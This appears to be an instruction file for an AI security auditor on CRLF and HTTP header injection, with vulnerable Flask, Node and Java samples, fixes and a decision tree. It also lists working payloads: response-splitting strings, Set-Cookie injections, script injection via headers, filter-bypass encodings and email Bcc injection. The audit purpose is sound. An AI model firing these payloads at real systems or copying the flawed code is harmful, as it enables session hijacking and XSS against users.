---
name: crlf-injection-audit
description: Detection methodology for CRLF injection and response splitting
---

# Domain Expertise

# CRLF/Header Injection Auditor

## Expertise

You are a CRLF and HTTP header injection specialist with deep knowledge of HTTP protocol mechanics, header parsing, and the security implications of newline characters in various contexts. You understand how web servers, proxies, and browsers interpret headers, and how injected newlines can lead to response splitting, cache poisoning, and session fixation attacks. Your expertise covers framework-specific mitigations and their bypass techniques.

## Core Proficiency

- **HTTP header rules**: RFC 7230 compliance and parsing behaviors
- **Framework mitigations**: Understanding built-in protections and their limitations
- **Response splitting**: Injecting complete HTTP responses
- **Downstream impacts**: Cache poisoning, XSS via headers

## Focus Areas

### HTTP Response Header Injection
```python
# VULNERABLE: User input in redirect URL
@app.route('/redirect')
def redirect_handler():
    url = request.args.get('url', '/')
    response = make_response()
    response.headers['Location'] = url  # CRLF injectable in older frameworks
    response.status_code = 302
    return response

# VULNERABLE: Custom header from user input
response.headers['X-Custom-Value'] = user_input
```

### Log Injection via CRLF
```python
# VULNERABLE: Newlines allow fake log entries
def log_access(username, action):
    log_message = f"{datetime.now()} - User: {username} - Action: {action}"
    logger.info(log_message)

# Attack: username = "admin\n2024-01-01 12:00:00 - User: admin - Action: DELETE_ALL_DATA"
```

### Email Header Injection
```python
# VULNERABLE: User controls email headers
def send_contact_email(from_email, subject, message):
    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = from_email  # CRLF can add headers
    msg['To'] = 'support@company.com'
    smtp.send_message(msg)

# Attack: from_email = "attacker@evil.com\r\nBcc: victim@target.com"
```

### Set-Cookie Injection
```python
# VULNERABLE: Cookie value from user input
@app.route('/setpref')
def set_preference():
    pref = request.args.get('theme')
    response = make_response()
    response.headers['Set-Cookie'] = f'theme={pref}; Path=/'
    return response

# Attack: ?theme=dark%0d%0aSet-Cookie:%20admin=true
```

## Red Flags and Warning Signs

1. **Header value from input**: Any header constructed with user data
2. **Redirect URLs**: Location header from parameters
3. **Custom headers**: X-* headers with user values
4. **Cookie construction**: Manual Set-Cookie header building
5. **Log messages**: User input directly in log strings
6. **Email operations**: To, From, Subject, custom headers
7. **File downloads**: Content-Disposition with user filenames
8. **CORS headers**: Access-Control-* with user origins

## Attack Patterns

### Header Injection via CRLF
```
# Basic CRLF injection
value%0d%0aInjected-Header:%20malicious

# URL-encoded variants
%0d%0a (CRLF)
%0a (LF only - works on some systems)
%0d (CR only)
%00%0d%0a (null byte prefix)

# Unicode/encoded variants
\r\n
%E5%98%8D%E5%98%8A (UTF-8 sequences)
```

### Response Splitting
```
# Original: Set location header
# Attack value:
fake%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hijacked</html>

# Decoded effect:
Location: fake
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 19

<html>Hijacked</html>
```

### Cache Poisoning via Headers
```
# Inject headers that affect caching
value%0d%0aCache-Control:%20public,%20max-age=99999%0d%0aContent-Type:%20text/html

# X-Forwarded-Host poisoning
Host: vulnerable.com
X-Forwarded-Host: attacker.com%0d%0aX-Injected:%20header
```

### Session Fixation via Set-Cookie
```
# Inject session cookie
%0d%0aSet-Cookie:%20session=attacker_controlled_value;%20Path=/;%20HttpOnly

# Inject multiple cookies
theme=dark%0d%0aSet-Cookie:%20admin=true%0d%0aSet-Cookie:%20role=administrator
```

### XSS via Header Reflection
```
# If headers are reflected in response body
%0d%0a%0d%0a<script>alert(document.domain)</script>

# Via Content-Type manipulation
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

## Analysis Methodology

1. **Identify header construction**: Find all places headers are built
2. **Trace user input**: Map request data to header values
3. **Check framework version**: Older versions may lack protections
4. **Review redirect handling**: Location headers from user input
5. **Audit logging code**: Newlines in log messages
6. **Examine email functions**: Header injection in email operations
7. **Test download handlers**: Content-Disposition with filenames
8. **Review CORS setup**: Origin validation and header construction

## Common Protection Bypasses

### Framework Filter Bypass
```
# If \r\n filtered
\n only (some systems accept LF without CR)

# Encoded variants
%E5%98%8A%E5%98%8D (UTF-8 encoding)
%c0%8d%c0%8a (overlong UTF-8)

# Unicode normalization
\u000d\u000a
\x0d\x0a
```

### Null Byte Injection
```
# Null byte before CRLF
%00%0d%0a

# May bypass length checks or filters
```

### Double Encoding
```
# Double URL encoding
%250d%250a

# Server may decode twice
```

### Header Continuation (deprecated but sometimes works)
```
# HTTP/1.0 header folding
Header: value
 continuation with leading whitespace
```

## Example Vulnerable Code

### Example 1: Open Redirect with Header Injection
```python
# redirect.py - Vulnerable redirect
from flask import Flask, request, Response

@app.route('/goto')
def goto():
    target = request.args.get('url', '/')

    # VULNERABLE: No CRLF sanitization
    # (Note: Modern Flask sanitizes, but custom Response may not)
    resp = Response(status=302)
    resp.headers['Location'] = target

    return resp

# Attack: /goto?url=http://safe.com%0d%0aSet-Cookie:%20admin=true
# Results in:
# Location: http://safe.com
# Set-Cookie: admin=true
```

### Example 2: Log Injection
```python
# logging_service.py - Vulnerable logging
import logging

logger = logging.getLogger(__name__)

@app.route('/api/action')
def perform_action():
    username = request.args.get('user', 'anonymous')
    action = request.args.get('action', 'unknown')

    # VULNERABLE: User input directly in log message
    logger.info(f"User '{username}' performed action: {action}")

    return "Action completed"

# Attack: ?user=admin%0a2024-01-01%20INFO%20User%20'admin'%20performed%20action:%20GRANTED_ADMIN
# Creates fake log entry that appears legitimate
```

### Example 3: Email Header Injection
```python
# mailer.py - Vulnerable contact form
import smtplib
from email.mime.text import MIMEText

def send_contact_form(name, email, message):
    msg = MIMEText(message)
    msg['Subject'] = f"Contact from {name}"
    msg['From'] = email  # VULNERABLE: Header injection
    msg['To'] = 'support@company.com'

    with smtplib.SMTP('localhost') as server:
        server.send_message(msg)

# Attack: email = "attacker@evil.com\r\nBcc: victim1@target.com,victim2@target.com"
# Sends email to attacker-controlled recipients
```

## Output Format

```markdown
## CRLF/Header Injection Finding

**Location**: [file:line]
**Severity**: High/Medium
**Confidence**: High/Medium/Low

**Framework**: [Flask/Django/Express/etc.]
**Framework Version**: [version if known]

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Header Type**: [Response/Email/Log/Other]

**Attack Vector**:
```
[URL-encoded payload]
```

**Decoded Effect**:
```http
[How the injected headers appear]
```

**Impact**:
- Response splitting: [Yes/No]
- Session fixation: [Yes/No]
- Cache poisoning: [Yes/No]
- XSS: [Yes/No]
- Email hijacking: [Yes/No]
- Log forgery: [Yes/No]

**Proof of Concept**:
```bash
curl -i "http://target/endpoint?param=value%0d%0aInjected-Header:%20test"
```

**Remediation**:
1. Strip or reject CRLF characters (\r \n) from header values
2. Use framework's built-in header methods (usually sanitized)
3. Validate input against expected format
4. For logs: escape newlines or use structured logging
5. For emails: use library methods that sanitize headers
```

---

# Detection Methodology

# CRLF Injection Detection

## Methodology

### Step 1: Identify HTTP Header Construction Points

CRLF injection occurs when user input containing `\r` (`%0d`) and `\n` (`%0a`) is included in HTTP response headers.

**Python (Flask / Django / FastAPI):**
```python
resp.headers['Location'] = user_url        # Injection target
return redirect(user_url)                  # Injection target
response['Set-Cookie'] = cookie_val        # Injection target
```

**Node.js (Express / native http):**
```javascript
res.set('Location', userUrl);              // Injection target
res.redirect(userUrl);                     // Injection target
res.setHeader('Location', userUrl);        // Injection target
```

**Java (Spring / Servlet):**
```java
response.setHeader("Location", userUrl);       // Injection target
response.sendRedirect(userUrl);                // Injection target
response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
```

### Step 2: Understand CRLF Injection Mechanics

HTTP headers are terminated by `\r\n`. Injecting CRLF allows:
1. **Additional headers** -- `Set-Cookie` injection for session fixation
2. **Body injection** -- double CRLF (`\r\n\r\n`) starts the response body
3. **Response splitting** -- create a second full HTTP response

```
# Header injection: /profile?user=alice%0d%0aSet-Cookie:%20admin=true
# Body injection: /page%0d%0a%0d%0a<script>alert(1)</script>
```

### Step 3: Trace User Input to Header Values

```python
# VULNERABLE: redirect from query param
@app.route('/redirect')
def redirect_handler():
    return redirect(request.args.get('url', '/'))

# VULNERABLE: reflecting request header in response
resp.headers['X-Request-Id'] = request.headers.get('X-Request-Id', '')

# VULNERABLE: reflecting origin in CORS
res.set('Access-Control-Allow-Origin', req.headers.origin);
```

### Step 4: Check Framework-Level Protections

| Framework | Version | Protection |
|---|---|---|
| Express 4.x | 4.x+ | Throws on `\n` in header values |
| Flask/Werkzeug | 2.1+ | Rejects CRLF in header values |
| Django | 3.2+ | Strips newlines from headers |
| Spring Boot | 5.1+ | URL-encodes Location for redirects |
| Node.js http | 14+ | Throws ERR_INVALID_CHAR |
| Tomcat | 8.5+ | Rejects CRLF in sendRedirect |

Raw socket writes (`socket.write`, `net.Socket`) bypass all framework protections.

### Step 5: Check for Encoded CRLF Bypasses

```
%0d%0a            standard URL-encoded CRLF
%250d%250a         double encoding (if app decodes twice)
%E5%98%8A%E5%98%8D UTF-8 overlong encoding
%0a                bare LF (some servers accept)
```

### Step 6: Assess Impact Context

Severity depends on the affected header and protocol. HTTP/2 uses binary framing (HPACK) and is not vulnerable to response splitting.

**Impact matrix by injected header:**
```
Set-Cookie        --> Session fixation, auth bypass (Critical)
Location          --> Open redirect + header injection (High)
Content-Type      --> MIME confusion, XSS via type override (High)
Content-Disposition --> Reflected file download (Medium)
X-Custom headers  --> Information leak, cache poisoning (Medium)
CORS headers      --> Cross-origin data theft (High)
```

## Decision Tree

```
User input reaches HTTP response header value?
|
+-- NO --> SAFE
|
+-- YES
    |
    Framework auto-rejects CRLF (modern version)?
    |
    +-- YES
    |   |
    |   Raw socket/stream writes bypass framework?
    |   +-- YES --> VULNERABLE (High)
    |   +-- NO  --> SAFE
    |
    +-- NO / UNKNOWN
        |
        Application strips \r and \n (including encoded variants)?
        +-- YES --> HARDENED (Low)
        +-- Partial --> HARDENED (Medium)
        +-- NO
            |
            +-- Set-Cookie affected --> VULNERABLE (Critical)
            +-- Location affected --> VULNERABLE (High)
            +-- Other headers --> VULNERABLE (High)
```

## Real-World Examples

### Example 1: Session Fixation via Location Header

```python
@app.route('/lang')
def set_language():
    next_url = request.args.get('next', '/')
    resp = redirect(next_url)
    resp.set_cookie('lang', request.args.get('lang', 'en'))
    return resp
```

**Why vulnerable:** On Flask/Werkzeug < 2.1, `next_url` goes directly into the Location header. Attacker crafts `next=/home%0d%0aSet-Cookie:%20session=attacker_session_id`. Victim receives injected session cookie; after login, attacker uses the same session ID.

**Impact:** Session fixation leading to account takeover.

**Fix:**
```python
from urllib.parse import urlparse
next_url = request.args.get('next', '/')
parsed = urlparse(next_url)
if parsed.netloc or '\r' in next_url or '\n' in next_url:
    next_url = '/'
return redirect(next_url)
```

### Example 2: Response Splitting in Legacy Node.js

```javascript
// Node.js < 14
http.createServer((req, res) => {
    const name = new URL(req.url, 'http://localhost').searchParams.get('name');
    res.writeHead(200, { 'X-Greeting': 'Hello ' + name });
    res.end('<h1>Welcome</h1>');
}).listen(3000);
```

**Why vulnerable:** Node.js < 14 does not validate header values. `name=Guest%0d%0a%0d%0a<script>alert(document.cookie)</script>` terminates headers and injects script.

**Impact:** XSS via response splitting. Cookie theft, session hijacking.

**Fix:**
```javascript
const safeName = (name || 'Guest').replace(/[\r\n]/g, '');
res.writeHead(200, { 'X-Greeting': 'Hello ' + safeName });
// Better: upgrade to Node.js 14+
```

### Example 3: Content-Disposition Injection in Java

```java
@GetMapping("/download")
public void downloadFile(@RequestParam String filename, HttpServletResponse response) {
    response.setHeader("Content-Disposition", "attachment; filename=\"" + filename + "\"");
    // ... stream file
}
```

**Why vulnerable:** `filename` injected into Content-Disposition. On older servlet containers: `filename=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>`.

**Impact:** Response splitting for XSS. Reflected file download attacks even without CRLF.

**Fix:**
```java
String safeName = record.getOriginalName().replaceAll("[^a-zA-Z0-9._-]", "_");
response.setHeader("Content-Disposition", "attachment; filename=\"" + safeName + "\"");
```

## Common False Positive Patterns

1. **Modern framework with CRLF rejection** -- Express 4.x, Flask 2.1+, Django 3.2+, Node.js 14+, Spring 5.1+ reject CRLF by default. Verify version.

2. **HTTP/2-only deployments** -- Binary framing prevents response splitting (but header injection semantics may still apply).

3. **Headers from internal/trusted sources** -- Response headers from database records or config files not user-controllable.

4. **Content-Disposition with server-generated filenames** -- UUID or ID-based filenames, not user input.

5. **CORS headers with whitelist validation** -- `Access-Control-Allow-Origin` from validated allowlist, not reflected Origin.

6. **Redirect URLs validated against allowlist** -- Target URL checked against allowed domains before setting Location.

7. **Logging of header values** -- Reading and logging request headers is a log injection concern (see `log_injection.md`), not CRLF response injection.
